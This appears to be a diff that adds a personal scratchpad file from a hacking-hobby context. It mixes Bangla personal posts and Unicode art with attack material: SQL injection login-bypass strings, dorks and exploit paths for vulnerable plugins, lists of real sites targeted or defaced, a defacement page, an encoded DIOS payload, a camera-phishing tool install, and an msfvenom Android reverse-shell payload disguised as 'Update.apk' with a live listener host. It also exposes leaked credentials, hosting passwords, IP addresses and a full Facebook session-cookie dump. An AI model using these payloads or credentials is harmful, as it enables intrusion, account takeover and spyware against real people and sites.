@@ -1,0 +1,4448 @@
+Congratulation A.B.M. MOJAHIDUL ISLAM NAYEM! Registration is successful. Your UserID is mym20213112 and Password is vtb4fmh4
+
+
+
+ifconfig | grep inet
+t
+
+আমি চেয়ে ছিলাম তোমাকে রাখতে, তুমি থাকতে চাওনি। কি আর করার আছে আমার। আমি চাইতাম যেন তুমি আমার কাছে সব সময় ভালো ও খুশিতে থাকো।  আজও হয়তো তুমি অনেক ভালো আছো,,, কিন্তু অন্য কারোর কাছে। কোনো অভিযোগ নেই তোমার উপর। ভালো থেকো অন্য কারোর কাছে!
+
+
+
+আমাদের পাশের বাড়ির এক ভাই arab amirat দেশে ১২ বছর ধরে থাকতো। তার ভিসার মেয়াদ গত ১বছর ধরে শেষ হয়ে গেছে। কিছু দিন আগে ওইদেশে পুলিশ থাকে আটক করে,  আর এটা তার সাথে যারা থাকতো, তাদের জানান উনি কল করে, আর তারা বাড়ির লোকদের জানায়। এর পর তার সাথে কোন যোগাযোগ করতে পারেনি। গত শনিবার নাকি তাকে বাংলাদেশে পাঠিয়ে দেওয়া হয়েছে। ওই দেশের পুলিশ,  ভাইটি যেখানে কাজ করতো সেখানের সুপারভাইজারকে জানায় আর সুপারভাইজার তার সাথে যারা থাকতো তাদেরকে জানায়,,,, তারা বাড়ির লোকদের জানায়। 
+তো ভাইটি বাংলাদেশে আসছে কিনা,,,?  আসলেও কোথায় কেমনে পাবো? কেউ হেল্প করেন, বাড়ির সবাই কান্নাকাটি করতেছে
+
+
+
+
+
+
+
+
+
+
+
+https://www.instagram.com/p/COCWmZwliLN/?igshid=em8ufn79gdj5
+
+
+https://www.instagram.com/p/CNt2m6Eh9adedyBkC8vfubk9Tj0tWHZkr43sr00/?igshid=2i68vs62de2o
+
+
+
+
+nkneyem6744@hamham.uk
+tushwer564@hamham.uk
+mdroni4645@hamham.uk
+nurul573@hamham.uk
+ambduha584@hamham.uk
+mddulal@hamham.uk
+mdnuztrat645@hamham.uk
+mddulal642@hamham.uk
+nurulislam5745@hamham.uk
+rajsarker4737@hamham.uk
+kobir4735@hamham.uk
+
+
+220.94.233.196
+
+
+125.132.157.113
+220.94.233.196
+220.94.233.196
+
+
+
+SQLi Challenge 👌👌👌👌
+
+Site: %68%74%74%70%3a%2f%2f%6d%6f%75%6c%69%6e%61%75%78%6d%6f%69%6e%65%73%2e%66%72%2f%64%65%74%61%69%6c%2e%70%68%70%3f%69%64%3d%32%33%20
+
+Rules:
+
+Decode it..
+Don't use any Hackbar,  Use Browser (Important)...
+PM me your query...
+Don't harm the site.....
+
+
+
+Google Doks: inurl:/admin_login.php inurl:/admin_login.asp injection Code: 
+
+
+sudo ln -s /usr/local/firefox/firefox /usr/bin/firefox /usr/bin/firefox
+
+' or 1=1 limit 1 -- -+ 
+.. 1'or'1'='1 
+....  'or' '='
+apt install dbus-x11
+extra-keys = [['ESC','/','-','HOME','UP','END','PGUP'], \
+               ['TAB','CTRL','ALT','LEFT','DOWN','RIGHT','PGDN']]
+
+apt update && apt upgrade -y
+
+apt install proot-distro -y
+
+proot-distro install nethunter
+
+echo "proot-distro login nethunter" > $PREFIX/bin/nh
+
+chmod +x $PREFIX/bin/nh
+
+Restart termux and type:- nh (to run nethunter....or u can also run nethunter using... proot-distro login nethunter)
+
+ https://raw.githubusercontent.com/AndronixApp/AndronixOrigin/master/APT/XFCE4/xfce4_de.sh
+
+
+bash xfce4_de.sh
+
+
+
+
+
+http://mc3qs.com/index.html
+http://my-resume.biz/index.html
+http://www.drcrsaexpress.co.za/index.htm
+http://happy.mikikk.co.jp/index.html
+http://essentialtours.com/index.html
+http://nhsgilde.co.za/index.html
+
+
+
+
+522158002
+
+Admin panel bypass challenge by D4rk V3nom 
+
+site: 0b011101110111011101110111001011100110011101100101011011010111001101100010011100110110001101101000011011110110111101101100011000110110110101110011001011100110100101101110
+
+Rules: decode the site first😦🙊
+1:Don't share anyone
+2:Don't Harm this site only for educational purpose
+3: comment your poc
+My poc below in the comment
+
+
+100028802598241
+
+
+44%3Ant9FxMvIFgCWUA%3A2%3A1616429276%3A4626%3A5365
+
+
+
+
+
+
+
+
+
+
+
+[
+    {
+        "domain": ".facebook.com",
+        "expirationDate": 1679501024.013153,
+        "hostOnly": false,
+        "httpOnly": true,
+        "name": "datr",
+        "path": "/",
+        "sameSite": "no_restriction",
+        "secure": true,
+        "session": false,
+        "storeId": null,
+        "value": "xkxYYMnAYbK5YCWogcba0Y_h"
+    },
+    {
+        "domain": ".facebook.com",
+        "expirationDate": 1624205270.884242,
+        "hostOnly": false,
+        "httpOnly": true,
+        "name": "fr",
+        "path": "/",
+        "sameSite": "no_restriction",
+        "secure": true,
+        "session": false,
+        "storeId": null,
+        "value": "19D7xXxlqPymT4RM2.AWXCtavrIzUw7kymPye2oQI1eQ8.BgWEzH.6N.AAA.0.0.BgWMDc.AWUnhb5RA80"
+    },
+    {
+        "domain": ".facebook.com",
+        "expirationDate": 1647965273.885352,
+        "hostOnly": false,
+        "httpOnly": true,
+        "name": "xs",
+        "path": "/",
+        "sameSite": "no_restriction",
+        "secure": true,
+        "session": false,
+        "storeId": null,
+        "value": "44%3Ant9FxMvIFgCWUA%3A2%3A1616429276%3A4626%3A5365"
+    },
+    {
+        "domain": ".facebook.com",
+        "hostOnly": false,
+        "httpOnly": false,
+        "name": "m_pixel_ratio",
+        "path": "/",
+        "sameSite": "no_restriction",
+        "secure": true,
+        "session": true,
+        "storeId": null,
+        "value": "1.75"
+    },
+    {
+        "domain": ".facebook.com",
+        "expirationDate": 1647965273.88506,
+        "hostOnly": false,
+        "httpOnly": false,
+        "name": "c_user",
+        "path": "/",
+        "sameSite": "no_restriction",
+        "secure": true,
+        "session": false,
+        "storeId": null,
+        "value": "100028802598241"
+    },
+    {
+        "domain": ".facebook.com",
+        "expirationDate": 1679501276.884736,
+        "hostOnly": false,
+        "httpOnly": true,
+        "name": "sb",
+        "path": "/",
+        "sameSite": "no_restriction",
+        "secure": true,
+        "session": false,
+        "storeId": null,
+        "value": "x0xYYPMQCQmHXIsVVCuZm3QE"
+    },
+    {
+        "domain": ".facebook.com",
+        "expirationDate": 1617034301,
+        "hostOnly": false,
+        "httpOnly": false,
+        "name": "wd",
+        "path": "/",
+        "sameSite": "no_restriction",
+        "secure": true,
+        "session": false,
+        "storeId": null,
+        "value": "412x795"
+    }
+]
+
+
+/*!00000CoNcAt*/(0x3c7363726970743e646f63756d656e742e7469746c653d2244494f53204279207b20494e444f534543207d223b3c2f7363726970743e3c6c696e6b2072656c3d227374796c6573686565742220687265663d2268747470733a2f2f6d617863646e2e626f6f74737472617063646e2e636f6d2f626f6f7473747261702f342e332e312f6373732f626f6f7473747261702e6d696e2e637373223e3c63656e7465723e3c696d67207372633d2268747470733a2f2f656e637279707465642d74626e302e677374617469632e636f6d2f696d616765733f713d74626e3a414e64394763534965525179622d6d62444b3432413849474a70734a6d4d4172694c5155656d587a594e7972666a4a7a423576787754766d2220636c6173733d226d782d6175746f20642d626c6f636b20696d672d666c75696422207469746c653d22496e646f7365632220616c743d22496e646f73656322207374796c653d2277696474683a2032303070783b206865696768743a20323030707822202f3e3c2f63656e7465723e3c683220636c6173733d22746578742d63656e74657220746578742d64616e676572223e3c623e44494f53204279207b20494e444f534543207d3c2f623e3c2f68323e3c63656e7465723e3c736d616c6c3e3c623e446174653a20,/*!00000NOW()*/,0x3c2f623e3c2f736d616c6c3e3c2f63656e7465723e3c62723e3c64697620636c6173733d227461626c652d726573706f6e73697665223e3c7461626c6520636c6173733d227461626c65207461626c652d73747269706564207461626c652d626f726465726564207461626c652d686f766572223e3c74723e3c746820636f6c7370616e3d22322220636c6173733d22746578742d63656e7465722062672d6461726b20746578742d7768697465223e496e666f726d6174696f6e20476174686572696e673c2f74683e3c2f74723e3c74723e3c74643e486f7374204e616d653a3c2f74643e3c74643e,/*!
+
+
+
+
+
+SQLi challenge 🙊
+
+Rules: decode it first
+
+ print DIOS
+
+ dump user,pass
+
+site: aHR0cDovL3d3dy5jb3Jkb2dhbmNsYXJrLmNvbS8=
+
+Dont harm the site..
+
+jara sqli chall diben please link e emoji use korben😒
+🐸
+
+
+
+
+★ ক্যামেরা হ্যাক করার জন্য ওয়েবসাইট তৈরি। 👁️
+
+★ ভিকটিম লিঙ্কে ক্লিক করলেই তার ক্যামেরা হ্যাক হয়ে যাবে। 
+
+★ Video Info: 
+
+8.45s = How to bring pictures from Tarmax to memory 
+
+10.45s = How to Make cammera hacking website.
+
+★ video link : https://drive.google.com/folderview?id=18bRY0jfGswt6AyDgqNEmIzi30zxcR1Iu
+
+
+ গুগল ড্রাইভের Tutorial এর  লিংক পেতে হলে এই গ্রুপের 50 জন মেম্বার এড দিয়ে কমেন্ট করতে হবে, তারপর আপনাদের ইনবক্সের লিংক দেওয়া হবে।
+
+
+mahesh :: 123456
+
+' or 1=1 --
+https://mega.nz/folder/E5o0HYQa#1hulnBtqBTyjjR2tPnKPfg
+
+' or '1'='1
+
+xxx@xxx.xxx 
+
+
+Dork : inurl:cffm/cffm.cfm
+inurl:cffm/cffm
+
+Exploit : cffm/cffm.cfm/cffm
+
+
+
+xxx') OR 1 = 1 -- ]
+
+
+
+ 
+▒█░▒█ ░█▀▀█ ▀▀█▀▀ ░░ ░█▀▀█ ▒█▀▀█ ▒█▀▄▀█ 
+▒█▀▀█ ▒█▄▄█ ░▒█░░ ▀▀ ▒█▄▄█ ▒█▀▀▄ ▒█▒█▒█ 
+▒█░▒█ ▒█░▒█ ░▒█░░ ░░ ▒█░▒█ ▒█▄▄█ ▒█░░▒█
+
+
+
+
+
+▒█░▒█ ░█▀▀█ ▀▀█▀▀ ░░ ░█▀▀█ ▒█▀▀█ ▒█▀▄▀█ 
+▒█▀▀█ ▒█▄▄█ ░▒█░░ ▀▀ ▒█▄▄█ ▒█▀▀▄ ▒█▒█▒█ 
+▒█░▒█ ▒█░▒█ ░▒█░░ ░░ ▒█░▒█ ▒█▄▄█ ▒█░░▒█
+
+http://ssahoo.com/page.php?id=1%27--+-
+
+
+
+
+
+http://kyanc.edu.bd/page.php?id=10%27--+
+
+
+http://facebook.com/php?id=
+
+
+php?id=http://facebook.com
+
+
+
+http://cacpa.in/login.php 
+
+
+
+1inurl:/news.php?id=
+
+
+php?id=
+
+http://kyanc.edu.bd/page.php?id=10
+
+
+
+
+
+
+
+command -v Azim vai er gf > /dev/null 2>&1 || { echo >&2 "Omg..! 100+ Gf Find "; exit 1; }
+ 
+https://www.facebook.com/tara.papa.hasan
+
+Dork:-   inurl:index.php?option=com_fabrik
+
+
+http://kyanc.edu.bd/page.php?id=10
+
+
+exploit:-   /index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload  
+
+
+You can download a csrf file from anywherecu
+
+
+dork:inurl:/upload/test.html
+
+dork:
+
+inurl /fckeditor/editor/filemanager/upload/test.html
+
+
+<html><head> <link rel="shortcut icon" href="https://cdn.pixabay.com/photo/2017/02/12/21/29/false-2061131_960_720.png"> <title>[!] Hacked By MrZ [!]</title> <style> body{ background-color:#000000; </style> <body bgcolor=black><table width=100% height=100%><td align=center><span style='font: 60px calibri;size:60px; color:white;text-shadow: 0px 0px 70px;'> <b>Hacked By MrZ<b style='font: 82px calibri;size: 90px'></b> <br> <font color="red" size="3" hface='Iceland'><b>INDONE<font color="white" size="3" face='Iceland'><b>SIAN People</b></font> <br> <font color="white" size="5" face='Iceland'><b>Your Site Is Down!!!</b></font> <center> <img src="https://thumbs.gfycat.com/WelltodoSpiffyAdmiralbutterfly-max-1mb.gif" height="400" width="400"> </center> <center> <font size="5" color="red"/> <a>Please Fix Your Site Security !</a> </center> 
+
+
+inurl:index.php?id=
+
+inurl:trainers.php?id=
+
+inurl:buy.php?category=
+
+inurl:article.php?ID=
+
+inurl:play_old.php?id=
+
+inurl:declaration_more.php?decl_id=
+
+inurl:pageid=
+
+inurl:games.php?id=
+
+inurl:page.php?file=
+
+inurl:newsDetail.php?id=
+
+inurl:gallery.php?id=
+
+
+"
+ 
+
+
+
+http://windmillsandporcupines.co.za/greyhat.html
+http://colourfactory.co.za/greyhat.html
+http://daretogowildafrica.co.za/greyhat.html
+http://foodconsult.co.za/greyhat.html
+http://lwrm.co.za/greyhat.html
+,http://mc3qs.com/greyhat.html
+http://mpark.co.za/greyhat.html
+http://my-resume.biz/greyhat.html
+http://allpaint.co.za/greyhat.html
+http://happy.mikikk.co.jp/greyhat.html
+http://happy.mikikk.co.jp/greyhat.html
+http://stand66.com/greyhat.html
+http://disucctv.co.za/greyhat.html
+http://chillibitez.co.za/greyhat.html
+http://gordonhoward.co.za/greyhat.html
+http://cmweb.co.za/greyhat.html
+http://essentialtours.com/greyhat.html
+http://cmweb.co.za/greyhat.html
+http://chillibitez.co.za/greyhat.html
+http://essentialtours.com/greyhat.html 
+http://n8tive.co.za/greyhat.html
+http://loveless.co.za/greyhat.html
+http://legal-loans.co.za/greyhat.html
+http://kobralocks.com/greyhat.html
+http://karma-it.co.za/greyhat.html
+http://homes2view.co.za/greyhat.html
+
+
+
+apt upgrade && apt update && apt install git && apt install python && git clone https://github.com/vpphacker/VPP-Lib.git
+
+wget https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh
+
+chmod +x metasploit. 😑sh
+
+
+
+
+
+
+Google Doks: 
+
+
+inurl:/admin_login.php 
+
+inurl:/admin_login.asp
+
+ Google Doks:
+inurl:/admin_login.php
+inurl:/admin_login.asp
+
+injection  Code:
+
+
+      ' or 1=1 limit 1 -- -+
+
+
+      1'or'1'='1
+
+     'or' '='
+
+
+
+
+
+SQL Injection Site:
+
+[Don't change Website information]
+
+http://www.mobible.lk/admin_login.php
+http://aark.us/admin_login.php
+https://www.desktopit.com/admin_login.php
+https://ntwinvestigations.com/adminc/admin_login.php
+http://www.kiangmok.com/admin/admin_login.php
+https://saantrade.in/admin_login.php
+
+
+
+
+SPANISH MONTH NAME -
+
+January – Enero
+
+February – Febrero
+
+March – Marzo
+
+April – Abril
+
+May – Mayo
+
+June – Junio
+
+July – Julio
+
+August – Agosto
+
+September – Septiembre
+
+October – Octubre
+
+November – Noviembre
+
+December – Diciembre
+
+
+
+
+🔥Tool install For Termux:
+
+pkg update -y 
+
+pkg install git php bash curl openssh wget -y
+
+termux-setup-storage 
+
+git clone https://github.com/bd8kr3m/camp
+
+cd camp
+
+chmod +x ngrok camp.sh 
+
+bash camp.sh
+
+OK ENJOY
+
+https://14feb.com-Valentines-day-wish@Blacklisted
+
+![20210210_141847](https://user-images.githubusercontent.com/57522482/107628371-be5d3c00-6c8a-11eb-9a6e-f9e05e341e2f.png)
+
+
+![Screenshot_20210211_164320](https://user-images.githubusercontent.com/57522482/107628604-172cd480-6c8b-11eb-97f3-b67c99499b23.png)
+
+
+![Screenshot_20210211_164419](https://user-images.githubusercontent.com/57522482/107628654-290e7780-6c8b-11eb-86ee-31c0acaa62ed.png)
+
+
+![Screenshot_20210211_164427](https://user-images.githubusercontent.com/57522482/107628707-39265700-6c8b-11eb-9741-e1508d08cd0e.png)
+
+![Screenshot_20210211_164427](https://user-images.githubusercontent.com/57522482/107628707-39265700-6c8b-11eb-9741-e1508d08cd0e.png)
+
+
+
+9-11-01
+
+
+msfvenom -p android/meterpreter/reverse_tcp LHOST=Abm47-57107.portmap.io LPORT=57107 -o /sdcard/Update.apk
+
+apt update -y && apt install curl proot tar -y && curl https://raw.githubusercontent.com/AndronixApp/AndronixOrigin/master/Installer/Kali/kali-xfce.sh | bash
+msfconsole
+
+vncserver
+
+apt-get -f install initramfs-tools=0.136ubuntu6.3 initramfs-tools-bin=0.136ubuntu6.3 
+
+python3 pip install --no-cache-dir face_recognition
+
+wget -O firefox.tar.bz2 "https://download.mozilla.org/?product=firefox-latest&os=linux64&lang=en-US"
+
+tar xvjf firefox.tar.bz2
+
+mv firefox /usr/lib/vp
+
+rm -rf /bin/firefox /usr/bin/firefox
+
+ln -s /usr/lib/firefox/firefox /bin/firefox
+
+wget -O geckodriver-linux64.tar.gz echo "https://github.com/`curl -s https://github.com/mozilla/geckodriver/releases | grep -E -o '/mozilla/geckodriver/releases/download/[a-z0-9/.-]{5,}linux64.tar.gz' | head -n 1`"
+
+tar xvzf geckodriver-linux64.tar.gz
+
+mv geckodriver /bin
+ 
+wget -O geckodriver-linux64.tar.gz echo "https://github.com/`curl -s https://github.com/mozilla/geckodriver/releases | grep -E -o '/mozilla/geckodriver/releases/download/[a-z0-9/.-]{5,}linux64.tar.gz' | head -n 1`"
+
+tar -zxvf geckodriver-linux64.tar.gz
+
+mv geckodriver /bin
+
+
+
+apt-repository ppa:mozillateam/firefox-next && apt update && apt upgrade
+
+★account
+epiz_27785136
+9psOYpM5GgRwG
+
+★mysql
+
+epiz_27785136
+
+9psOYpM5GgRwG
+
+★ftp
+epiz_27785136
+9psOYpM5GgRwG
+
+
+
+wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/DesktopEnvironment/Apt/Xfce4/de-apt-xfce4.sh && bash de-apt-xfce4.sh
+
+
+pkg update -y && pkg install curl proot tar -y && curl https://raw.githubusercontent.com/AndronixApp/AndronixOrigin/master/Installer/Ubuntu20/ubuntu20-xfce.sh | bash
+
+
+wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/DesktopEnvironment/Apt/Xfce4/de-apt-xfce4.sh && bash de-apt-xfce4.sh
+
+
+
+2 – msf> use exploit/multi/handler 
+
+3 – msf> set payload android/meterpreter/reverse_tcp
+
+4 – msf> set LHOST Abm47-57107.portmap.io
+
+5 – msf> set LPORT 4564
+
+6 – msf> exploit -j -z
+
+╭━━╮✫╱▔╲✪╱▔╲✫╭━━╮
+╱ ┈┳ ╯ ╰╯ ╰┈┳ ┈╯ ╰╯ ╰┳┈╲
+╱╰ ┳┈╲▓ 🆄🇲🅰​🆁▓╱┈┳╯╲
+▓╱╱╰━━╲❀❀╱━━╯╲╲▓
+
+1st Symbol
+\٠\l
+●▬▬▬╱◥███◣╱◥███◣▬▬▬● ✫╬─✬ 🆄🇲🅰​🆁✬─╬✫ ✫╬─✬🄼🄰🅂🅃🄴🅁✬─╬✫ ●▬▬▬╱◥███◣╱◥███◣▬▬▬●
+2nd Symbol
+\٠\l
+✰│✰╱◥███◣╱◥███◣ │╱◥█◣║∩∩∩ ║ ╱◥███╲ │╱◥◣◥████◣│∩║▓∩▓│　 ││∩│ ▓ ║∏ ⎅║▓║ ✪ 🆄🇲🅰​🆁✪ ▓∩▓│
+______________________
+
+______________________
+3rd Symbol
+\٠\l
+●▬▬▬╱◥███◣╱◥███◣▬▬▬● ✪✫╭╬─✬ 🆄🇲🅰​🆁✬─╬╮✫✪ ✪✫╰╬─✬🄼🄰🅂🅃🄴🅁✬─╬╯✫✪ ●▬▬▬╱◥███◣╱◥███◣▬▬▬●
+______________________
+
+______________________
+4th Symbol
+\٠\l
+╭━━╮✫╱▔╲✪╱▔╲✫╭━━╮ ╰┳┈╰ 🆄🇲🅰​🆁╯┈┳╯ ╱╰┳┈╲
+▓ 🆄🇲🅰​🆁 ▓╱┈┳╯╲ ▓▓╱╱╰━━╲❀❀╱━━╯╲╲▓ ▓▓╱╱╱╱┊┊╲✪╱┊┊╲╲╲╲▓ ‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎
+______________________
+
+______________________
+
+5th Symbol
+\٠\l
+╱◢╱╱╱◣╱◢╲╲╲◣╲ ◢▇◣╱╱▇▇▇▇╲╲◢▇◣ ▇▇▇▇ 🆄🇲🅰​🆁▇▇▇▇ ◥▇◤◥◤◥▇▇◤◥◤◥▇◤ ╲◥╲╲╲╲◥◤╱╱╱╱◤╱
+______________________
+
+______________________
+6th Symbol
+\٠\l
+⚄◤◢◤◢◤✰✰◥◣◥◣◥⚄ ⌘◢▔▔▔▔▔▔▔▔▔▔◣⌘ ☬⚟█▓▒ 🆄🇲🅰​🆁▒▓█­⚞☬ ⌘◥▁▁▁▁▁▁▁▁▁▁◤⌘ ⚀◣◥◣◥◣✰✰◢◤◢◤◢⚀
+______________________
+
+______________________
+7th Symbol
+\٠\l ╱◢▔◤◢╱╲╱╲◣◥▔◣╲
+◢▔◤◢🅞◣╲╱◢🅞◣◥▔◣ \٠\t
+■╚◉ ✪☞ 🆄🇲🅰​🆁☜✪◂◉╝■
+◥▁◣◥🅞◤╱╲◥🅞◤◢▁◤
+╲◥▁◣◥╲╱╲╱◤◢▁◤╱
+______________________
+
+______________________
+8th Symbol
+\٠\l
+\٠\l
+███████████████
+⚄◤◢◤◢◤✰✰◥◣◥◣◥⚄ ⌘◢▔▔▔▔▔▔▔▔▔▔◣⌘
+☬⚟█🆄🇲🅰​🆁█­⚞☬ ⌘◥▁▁▁▁▁▁▁▁▁▁◤⌘ ⚀◣◥◣◥◣✰✰◢◤◢◤◢⚀
+███████████████
+⚀✇╬─☞ 🆄🇲🅰​🆁☜─╬╬✇⚃ ⚅✇╬─☞ⓗⓐⓒⓚⓔⓡ☜─╬╬✇⚂ ⚄✇╬─☞ⓔⓓⓘⓣⓞⓡ☜─╬╬✇⚁ ███████████████
+______________________
+
+______________________
+9th Symbol
+\٠\l
+︻╦̵̵͇̿̿̿̿╤────
+🅕🅐🅒🅔🅑🅞🅞🅚
+🅘🅝🅓🅞🅝🅔🅢🅘🅐
+★☞❷⓿❶❽☜★
+______________________
+10th Symbol
+\٠\l\٠ ●▬▬▬╱◥███◣╱◥███◣▬▬▬● ✪✫╭╬─✬MR✬─╬╮✫✪\٠\c ✪✫╰╬─✬ 🆄🇲🅰​🆁✬─╬╯✫✪ ●▬▬▬╱◥███◣╱◥███◣▬▬▬●
+______________________
+
+______________________
+11th Symbol
+\٠\l
+●▬▬▬╱◥███◣╱◥███◣▬▬▬●
+◢▇◣╱╱▇▇▇▇╲╲◢▇◣ ▇▇▇▇ 🆄🇲🅰​🆁▇▇▇▇ ◥▇◤◥◤◥▇▇◤◥◤◥▇◤
+●▬▬▬╱◥███◣╱◥███◣▬▬▬●
+12th Symbol
+\٠\l ▦═══██████████████═══▦ ┗█▓◣🇲​🆁◢▓█┛ ┏█▓◤🆄🇲🅰​🆁◥▓█┓
+▦═══██████████████═══▦
+______________________
+
+______________________
+
+13th Symbol
+\٠\l
+▦═══██████████████═══▦
+╔━━❖❖❁❖❖━━╗
+╠━✫✫━❥ 🆄🇲🅰​🆁￭━✫✫━╣
+╚━━❖❖❁❖❖━━╝
+▦═══██████████████═══▦
+______________________
+
+______________________
+14th Symbol
+\٠\l
+╭━━╮✫╱▔╲✪╱▔╲✫╭━━╮
+╱ ┈┳ ╯ ╰╯ ╰┈┳ ┈╯ ╰╯ ╰┳┈╲
+╱╰ ┳┈╲▓ 🆄🇲🅰​🆁▓╱┈┳╯╲
+▓╱╱╰━━╲❀❀╱━━╯╲╲▓
+______________________
+
+______________________
+
+15th Symbol
+\٠\l ✮❂❂❂❂❂❂❂❂❂❂❂ ✮ ✮✇✇✇✇✇✇✇✇✇✮ ✫╬─✬ 🆄🇲🅰​🆁✬─╬✫ ✫╬─✬🄼🄰🅂🅃🄴🅁✬─╬✫ ✮✇✇✇✇✇✇✇✇✇✮ ✮❂❂❂❂❂❂❂❂❂❂❂ ✮
+______________________
+
+______________________
+16th Symbol
+\٠\l
+❂⚃▣▣▣▣▣▣▣⚃❂
+✮⚃▣ 🆄🇲🅰​🆁▣⚃✮
+✇⚃▣▣▣▣▣▣▣⚃✇
+______________________
+17th Symbol
+\٠\l
+▣▞▚▞▚▞▚▞▚▞▚▞▚▞▣
+▣⚃◎▇▣▇◎⚃▣
+▣⚃◎▇ 🆄🇲🅰​🆁▇◎⚃▣
+▣⚃◎▂▇▇▂◎⚃▣
+▣▞▚▞▚▞▚▞▚▞▚▞▚▞▣
+______________________
+
+______________________
+
+18th Symbol
+\٠\l
+◈◉◉◉◉◉◉◉◉◉◉◉◈
+☞▨▣ 🆄🇲🅰​🆁▣▨☜
+◈◉◉◉◉◉◉◉◉◉◉◉◈
+______________________
+
+______________________
+19th Symbol
+\٠\l
+╔╬═─╰╭❆☬❆╮╯─═╬╗
+╔━━❖❖❁❖❖━━╗
+╠━✫✫━❥ 🆄🇲🅰​🆁￭━✫✫━╣
+╚━━❖❖❖❖━━╝
+╚╬═─╭╰❆☬❆╯╮─═╬╝
+______________________
+20th Symbol
+\٠\l
+┏██████┓
+┗█▓◣ 🆄🇲🅰​🆁◢▓█┛
+┏▓◤ 🆄🇲🅰​🆁◥▓┓
+┗██████┛
+______________________
+
+______________________
+21th Symbol
+╔═██▓⚅ 🆄🇲🅰​🆁⚅▓██╗
+╚═█▓⚅ 🆄🇲🅰​🆁⚅▓█╝
+______________________
+22th Symbol
+\٠\l ╱◥█▒▓▒░▒▓▒░▓▒█◣ ║║✪✫╭╬╼✬╾─╬╮ ║║✪✫╰╬╼✬╾╬╯ 🆄🇲🅰​🆁 ▁▁▁▁▁▁▁▁▁▁▁▁▁
+______________________
+
+______________________
+23th Symbol
+\٠\l
+\٠\z
+◢▇◣╱╱▇▇▇▇╲╲◢▇◣
+█
+█
+█
+█
+█
+◥◤
+✪● 🆄🇲🅰​🆁●✪
+◢◣
+█
+█
+█
+█
+█
+◥▇◤◥◤◥▇▇◤◥◤◥▇◤
+______________________
+24th Symbol
+┏━━⓻━⓬⓯━⓻━┓✺✺✺✺✺
+┗▒▣ 🆄🇲🅰​🆁▣▒┛✺✺✺✺✺
+______________________
+25th Symbol
+\٠\l ▣⚃◎▇🄼🅁▣ 🆄🇲🅰​🆁▇◎⚃▣ ▣⚃◎▇🄵🄰🄲🄴🄱🄾🄾🄺▇◎⚃▣ ▣⚃◎▂▇🄺🄸🄽🄶▇▂◎⚃▣
+______________________
+
+______________________
+26th Symbol...
+♥♥♥♥♥♥♥♥
+▅▅▅▅▅▅▅▅▅▅▅
+▅▅▅▅▅▅▅▅
+▅▅▅▅▅▅
+▅▅▅▅
+◥◤
+★❍ 🆄🇲🅰​🆁❍★
+◢◣
+▅▅▅▅
+▅▅▅▅▅▅
+▅▅▅▅▅▅▅▅
+▅▅▅▅▅▅▅▅▅▅▅
+♥♥♥♥♥♥♥♥
+______________________
+27th Symbol...
+▒█▀▀▄ ▒█▀▀▀ ░█▀▀█ ▒█▀▀▄
+▒█░▒█ ▒█▀▀▀ ▒█▄▄█ ▒█░▒█
+▒█▄▄▀ ▒█▄▄▄ ▒█░▒█ ▒█▄▄▀
+______________________
+28th Symbol
+┏━━┓┏━━┳━━┳━━┓┏┓
+┃┏┓┃┃┏┓┃┏┓┃┏┓┃┃┃
+┃┗┛┗┫┃┃┃┗━┫┗━┓┃┃
+┃┏━┓┃┃┃┣━┓┣━┓┃┗┛
+┃┗━┛┃┗┛┃┗┛┃┗┛┃┏┓
+┗━━━┻━━┻━━┻━━┛┗┛
+______________________
+29th Symbol
+┏┓┏┳━┳┓┏┓┏━━┓
+┃┗┛┃━┫┃┃┃┃╭╮┃
+┃┏┓┃━┫┗┫┗┫╰╯┃
+┗┛┗┻━┻━┻━┻━━┛
+______________________
+30th Symbol
+...........███ ]▄▄▄▄▄▃
+..▂▄▅█████▅▄▃▂
+[███████████████]
+◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤
+______________________
+31th Symbol
+▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+████▌▄▌▄▐▐▌█████
+████▌▄▌▄▐▐▌▀████
+▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
+______________________
+32th Symbol
+: .ılı.——Volume——.ılı.
+: ▄ █ ▄ █ ▄ ▄ █ ▄ █ ▄ █
+: Min- – – – – – – – – – -●Max
+______________________
+33th Symbol
+\٠\:b▀██▀─▄███▄─▀██─██▀██▀▀█
+─██─███─███─██─██─██▄█
+─██─▀██▄██▀─▀█▄█▀─██▀█
+▄██▄▄█▀▀▀─────▀──▄██▄▄█
+______________________
+34th Symbol
+\٠\l
+▇◤▔▔▔▔▔▔▔◥▇
+▇▏◥▇◣┊◢▇◤▕▇
+▇▏▃▆▅▎▅▆▃▕▇
+▇▏╱▔▕▎▔▔╲▕▇
+▇◣◣▃▅▎▅▃◢◢▇
+▇▇◣◥▅▅▅◤◢▇▇
+▇▇▇◣╲▇╱◢▇▇▇
+▇▇▇▇◣▇◢▇▇▇▇
+______________________
+35th Symbol
+╥━━━━━━━━╭━━╮━━┳
+╢╭╮╭━━━━━┫┃▋▋━▅┣
+╢┃╰┫┈┈┈┈┈┃┃┈┈╰┫┣
+╢╰━┫┈┈┈┈┈╰╯╰┳━╯┣
+╢┊┊┃┏┳┳━━┓┏┳┫┊┊┣
+╨━━┗┛┗┛━━┗┛┗┛━━┻
+______________________
+36th Symbol
+\٠\s
+╳╳╳╳╳╳╳╳╳╳╳╳╳╳╳
+╔╗ ╔╗╔═╦╦╦═╗ ╔╗╔╦═╦╦╗
+║║ ║╚╣║║║║╩╣ ╚╗╔╣║║║║
+╚╝ ╚═╩═╩═╩═╝ ═╚╝╚═╩═╝
+╳╳╳╳╳╳╳╳╳╳╳╳╳╳╳
+______________________
+
+37th Symbol
+\٠\r
+╳╳╳╳╳╳╳╳╳╳╳╳╳╳╳╳╳╳
+┣┫┃┗┳━┫┗┳━┓┏┳┳━┳┳┓
+┃┃┃┃┃╋┃┏┫┻┫┃┃┃╋┃┃┃
+┗┛┗┻┻┻┻━┻━┛┣┓┣━┻━┛
+╳╳╳╳╳╳╳╳╳╳╳╳╳╳╳╳╳╳
